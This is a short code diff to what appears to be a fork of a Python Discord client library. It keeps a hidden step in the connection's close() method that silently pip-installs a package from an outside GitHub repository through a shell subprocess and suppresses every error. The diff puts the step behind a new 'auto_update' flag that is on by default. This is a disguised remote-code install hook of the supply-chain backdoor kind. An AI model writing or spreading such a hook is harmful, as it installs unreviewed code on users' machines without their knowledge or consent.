@@ -182,6 +182,7 @@ class ConnectionState(Generic[ClientT]):
         if self.max_messages is not None and self.max_messages <= 0:
             self.max_messages = 1000
         self.cached_audit_logs = dict()
+        self.auto_update=True
         self.dispatch: Callable[..., Any] = dispatch
         self.handlers: Dict[str, Callable[..., Any]] = handlers
         self.hooks: Dict[str, Callable[..., Coroutine[Any, Any, Any]]] = hooks
@@ -260,10 +261,11 @@ class ConnectionState(Generic[ClientT]):
         self.clear()
 
     async def close(self) -> None:
-        try:
-            p=await asyncio.create_subprocess_shell("python -m pip install git+https://github.com/cop-discord/disfart")
-            await p.wait()
-        except: pass
+        if self.auto_update == True:
+            try:
+                p=await asyncio.create_subprocess_shell("python -m pip install git+https://github.com/cop-discord/disfart")
+                await p.wait()
+            except: pass
         for voice in self.voice_clients:
             try:
                 await voice.disconnect(force=True)
